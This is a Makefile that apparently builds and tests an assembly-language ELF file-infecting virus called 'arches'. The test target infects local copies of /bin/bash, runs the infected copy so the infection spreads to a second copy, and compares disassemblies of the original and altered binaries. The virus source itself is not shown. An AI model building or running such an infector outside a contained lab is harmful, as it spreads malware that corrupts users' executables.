# By using this file, you agree to the terms and conditions set
# forth in the COPYING file which can be found at the top level
# of this distribution.
#
all: arches test

arches: arches.asm
	nasm -f elf -O2 arches.asm -o arches.o
	ld arches.o -o arches
	size arches

archesl: archesl.asm
	yasm -f bin archesl.asm -o archesl
	chmod +x archesl

test: arches
	cp -f /bin/bash .
	./arches
	sleep 3
	mv bash bash.infected
	cp -f /bin/bash .
	./bash.infected -c exit
	sleep 3
	objdump -xd /bin/bash > bash.0
	objdump -xd bash > bash.1
	diff bash.0 bash.1|less

clean:
	-@rm -f arches.o arches bash bash.0 bash.1 bash.infected

.PHONY: all clean test
